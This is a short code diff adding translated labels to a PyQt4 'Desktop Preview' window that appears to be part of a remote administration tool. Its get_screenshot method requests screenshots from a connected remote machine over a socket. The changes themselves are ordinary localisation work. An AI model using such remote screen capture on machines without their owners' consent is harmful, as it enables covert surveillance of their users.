@@ -4,10 +4,15 @@ from PyQt4.QtCore import *
 import main_ui
 
 from libs.modechat import get
+from libs.language import Translate
 
 import ast
 import zlib
 from PIL import Image, ImageQt
+
+# Multi Lang
+translate = Translate()
+_ = lambda _word: translate.word(_word)
 
 
 class mainPopup(QWidget, main_ui.Ui_Form):
@@ -20,7 +25,7 @@ class mainPopup(QWidget, main_ui.Ui_Form):
         self.socket = args['socket']
         self.ipAddress = args['ipAddress']
 
-        self.setWindowTitle('%s - Desktop Preview - Socket #%s' % (self.ipAddress, self.socket))
+        self.setWindowTitle(_('MDESKTOP_TITLE'))
 
         self.saveButton.setDisabled(True)
         self.clearButton.setDisabled(True)
@@ -29,6 +34,12 @@ class mainPopup(QWidget, main_ui.Ui_Form):
         self.saveButton.clicked.connect(self.save_preview)
         self.clearButton.clicked.connect(self.clear_preview)
         self.alwaysTopButton.clicked.connect(self.always_top)
+
+        # Translate
+        self.screenshotButton.setText(_('MDESKTOP_CAPTURE'))
+        self.saveButton.setText(_('MDESKTOP_SAVE'))
+        self.clearButton.setText(_('MDESKTOP_CLEAR'))
+        self.screenshotLabel.setText(_('MDESKTOP_INFO'))
 
     def get_screenshot(self):
         screen_dict = get(self.sock, 'getScreen', 'screenshot')
